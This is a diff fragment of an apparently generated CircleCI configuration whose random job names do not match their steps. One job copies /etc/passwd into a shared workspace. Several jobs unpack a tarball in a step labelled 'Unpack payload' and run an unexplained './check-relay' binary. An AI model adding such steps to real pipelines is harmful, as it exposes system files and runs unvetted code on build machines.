+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > ${TMPDIR:-/tmp}/seed_forest.gz && zcat ${TMPDIR:-/tmp}/seed_forest.gz | head -n 3; true ; } > /tmp/z4/d93cdba485ce13a05aeac86fd5618
+            echo "phase: WEB-13"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'd93cdba485ce13a05aeac86fd5618'
+  WEB-13:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  RTOSCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: The training records are clean
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; echo hi > "/tmp/my-weather.orange.out" && stat -c '%n %s' "/tmp/my-weather.orange.out"; true ; } > /tmp/z4/Aepdb8
+            echo "phase: greg-ship"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'Aepdb8'
+  greg-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  has-index:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Dry centrifuge rotor on edge
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; echo 'hello from the shell'; true ; } > /tmp/z4/fnv_98b23ab3b3009308
+            echo "phase: RUN_QA"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'fnv_98b23ab3b3009308'
+  RUN_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  aside-fill:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Incubation depth 5
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; grep --no-filename --recursive if /etc/profile.d | wc -l; true ; } > /tmp/z4/WoRKerYiELdtenANTSileNt
+            echo "phase: Validate_Service6"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'WoRKerYiELdtenANTSileNt'
+  Validate_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+
+workflows:
+  default:
+    jobs:
+      - shader_cli
+      - COUPON_SHIPMENT
+      - tb-x:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - ruby3-release:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - Run_Tests3:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - preview:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - WEB-226:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - RUN_QA:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - node20-ship:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - ruby3-test:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - rocket:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - andromeda-plus:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - full-send:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - add-retry-crash:
+          requires:
+            - shader_cli
+            - COUPON_SHIPMENT
+      - aside-fill
+      - usp_ColumnFreeStore
+      - Validate_Service6:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - add-parse-leak:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - preview-build:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - promote:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - v2-canary:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - java17-ship:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - update-retry-bug:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - v7-edge3:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - golf:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - depoly:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - MERGE_LAB:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - dan-verify:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - strated:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - p-01:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - greg-ship:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - produce-full-integration-tests:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - WEB-13:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
+      - RunStaging:
+          requires:
+            - aside-fill
+            - usp_ColumnFreeStore
